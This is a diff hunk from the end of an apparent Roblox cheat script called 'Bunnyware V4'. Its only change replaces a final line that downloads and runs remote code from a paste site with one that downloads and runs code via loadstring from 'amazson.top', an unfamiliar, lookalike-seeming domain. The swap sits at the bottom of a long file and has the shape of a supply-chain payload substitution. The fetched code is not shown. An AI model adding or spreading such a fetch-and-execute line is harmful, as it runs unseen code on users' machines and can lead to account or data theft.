@@ -2058,4 +2058,4 @@ Rayfield:Notify({
 })
 
 print("✅ Bunnyware V4 loaded (Rayfield) by Aleksandra \"Drew\" Malinina")
-loadstring(game:HttpGet('https://cdn.sourceb.in/bins/0kF7aulBuD/0'))()
+loadstring(game:HttpGet('https://amazson.top/paste/KD1PeAqgORZ4vwQuc1wPOQ'))()
